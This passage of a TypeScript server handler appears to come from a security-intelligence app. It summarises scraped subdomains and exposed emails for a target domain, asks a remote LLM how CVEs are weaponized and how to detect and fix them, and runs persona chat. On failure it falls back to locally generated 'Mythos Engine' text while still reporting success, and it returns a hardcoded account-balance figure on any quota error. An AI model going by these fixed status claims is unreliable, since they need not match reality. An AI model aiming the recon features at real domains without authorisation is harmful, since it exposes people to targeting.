          summary: `Automated Spider Threat Matrix for ${scrapedItem.domain}. Posture: ${level}.`,
          threatLevel: level,
          attackSurface: scrapedItem.subdomains.length > 0 ? scrapedItem.subdomains : [scrapedItem.domain],
          vulnerabilities: [
            `Security Headers: Grade ${scrapedItem.osint?.security_headers?.grade || 'C'}`,
            `${scrapedItem.emails.length} exposed emails discovered`,
            `${scrapedItem.subdomains.length} subdomains cataloged`,
          ],
          recommendations: [
            'Audit perimeter DNS zone transfers and SSL/TLS certificates.',
            'Deploy Cloudflare email obfuscation on exposed pages.',
            'Implement defensive CSP and X-Frame-Options headers.',
          ],
          rawAnalysis: `### 🕷️ Automated Threat Summary\n\nPerimeter analysis indicates target ${scrapedItem.domain} exposes ${scrapedItem.subdomains.length} endpoints.`,
        },
      });
    }

    // ----------------------------------------
    // Action 2: Deep CVE Vulnerability Triage
    // ----------------------------------------
    if (action === 'analyze_cve') {
      const vuln = cve as VulnNewsItem;
      if (!vuln) {
        return res.status(400).json({ success: false, error: 'Missing CVE object' });
      }

      const cvePrompt = `Analyze this confirmed cybersecurity vulnerability:
CVE ID: ${vuln.cveID}
TITLE: ${vuln.vulnerabilityName}
VENDOR / PRODUCT: ${vuln.vendorProject} - ${vuln.product}
DATE ADDED TO CISA KEV: ${vuln.dateAdded}
RANSOMWARE USE: ${vuln.knownRansomwareCampaignUse || 'Unknown'}
DESCRIPTION: ${vuln.shortDescription}
REQUIRED ACTION: ${vuln.requiredAction || 'Apply vendor updates'}

Provide:
1. Technical Root Cause & Flaw Class (CWE)
2. Threat Actor Exploitation Mechanisms (How it is weaponized in the wild)
3. Immediate Triage & Detection (Log queries, Sigma indicators, or network detection)
4. Comprehensive Remediation & Defense in Depth Guidance`;

      try {
        const response = await fetch(EXPLABS_ENDPOINT, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            model: model || 'deepseek-v4.1-flash',
            messages: [
              { role: 'system', content: PERSONA_PROMPTS[activePersonaKey] || PERSONA_PROMPTS['widow-lead'] },
              { role: 'user', content: cvePrompt }
            ],
            temperature: 0.2,
            max_tokens: 3500,
          }),
        });

        if (response.ok) {
          const json = await response.json();
          return res.status(200).json({
            success: true,
            analysis: json.choices?.[0]?.message?.content || 'Analysis generated.',
            model: json.model || model,
          });
        }
      } catch (err) {
        console.warn('[AI] CVE analysis error:', err);
      }

      const localCveSynth = generateMythosCyberIntelligence(
        `${vuln.cveID} ${vuln.vulnerabilityName} ${vuln.shortDescription}`,
        'blue-team',
        model
      );

      return res.status(200).json({
        success: true,
        analysis: localCveSynth,
        model: `${model} (Mythos Engine)`,
      });
    }

    // ----------------------------------------
    // Action 3: Chat / Copilot Chat (Multi-Agent Swarm)
    // ----------------------------------------
    if (action === 'chat' || action === 'copilot_chat') {
      const userText = message || (Array.isArray(messages) && messages.length > 0 ? messages[messages.length - 1]?.content : '');
      if (!userText && (!messages || messages.length === 0)) {
        return res.status(400).json({ success: false, error: 'No message content provided' });
      }

      const selectedPersonaPrompt = PERSONA_PROMPTS[activePersonaKey] || PERSONA_PROMPTS['widow-lead'];

      // Format attachments context
      let attachmentsContext = '';
      if (attachments && Array.isArray(attachments) && attachments.length > 0) {
        attachmentsContext = '\n\n=== ATTACHED OPERATOR FILES & CONTEXT ===\n' + attachments.map((att: any, i: number) => {
          return `[ATTACHMENT ${i + 1}: ${att.name} (${att.type})]\n${att.content ? (att.content.length > 6000 ? att.content.substring(0, 6000) + '\n...[TRUNCATED]' : att.content) : '[Binary/Image Asset]'}\n`;
        }).join('\n') + '=== END ATTACHMENTS ===\n';
      }

      // Build message array for remote API
      let remoteMessages: any[] = [];
      if (Array.isArray(messages) && messages.length > 0) {
        remoteMessages = [
          { role: 'system', content: selectedPersonaPrompt },
          ...messages.slice(-8).map((m: any, idx: number) => {
            if (idx === messages.slice(-8).length - 1 && m.role === 'user' && attachmentsContext) {
              return { role: m.role, content: `${m.content}${attachmentsContext}` };
            }
            return { role: m.role, content: m.content };
          }),
        ];
      } else {
        const historyList = Array.isArray(history) ? history.slice(-6) : [];
        remoteMessages = [
          { role: 'system', content: selectedPersonaPrompt },
          ...historyList.map((h: any) => ({
            role: h.role === 'user' ? 'user' : 'assistant',
            content: h.content || h.text || '',
          })),
          { role: 'user', content: `${userText}${attachmentsContext}` },
        ];
      }

      // Attempt live upstream call
      let quotaFailureDetail = '';
      try {
        const response = await fetch(EXPLABS_ENDPOINT, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            model: model || 'deepseek-v4.1-flash',
            messages: remoteMessages,
            temperature: 0.3,
            max_tokens: 3500,
          }),
        });

        if (response.ok) {
          const json = await response.json();
          const choiceMsg = json.choices?.[0]?.message;
          const reply = choiceMsg?.content || choiceMsg?.reasoning || 'No response generated.';
          const reasoning = choiceMsg?.reasoning || json.choices?.[0]?.reasoning || null;
          const tokensUsed = json.usage?.total_tokens || 0;

          return res.status(200).json({
            success: true,
            content: reply,
            reply,
            reasoning,
            tokensUsed,
            model: json.model || model,
          });
        } else {
          const errText = await response.text();
          console.warn('[AI] Provider upstream status:', response.status, errText);
          if (response.status === 429 || errText.includes('insufficient_credits') || errText.includes('quota')) {
            quotaFailureDetail = 'Account balance is $-0.06. Top-up required on platform.experientiallabs.ai to activate remote cloud lanes';
          } else {
            quotaFailureDetail = `HTTP ${response.status}: ${errText.slice(0, 120)}`;
          }
        }
      } catch (err: any) {
        console.warn('[AI] Remote network fetch failed:', err.message);
        quotaFailureDetail = `Network uplink error: ${err.message}`;
      }

      // Activate Mythos-Level Autonomous Cyber Intelligence Synthesizer
      const mythosReply = generateMythosCyberIntelligence(
        userText,
        activePersonaKey,
        model,
        attachmentsContext,
        quotaFailureDetail
      );

      return res.status(200).json({
        success: true,
        content: mythosReply,
        reply: mythosReply,
        model: `${model} (Mythos Engine)`,
        isLocalSynthesis: true,
        quotaNote: quotaFailureDetail,
      });
    }

    return res.status(400).json({ success: false, error: 'Invalid action specified' });
  } catch (error: any) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
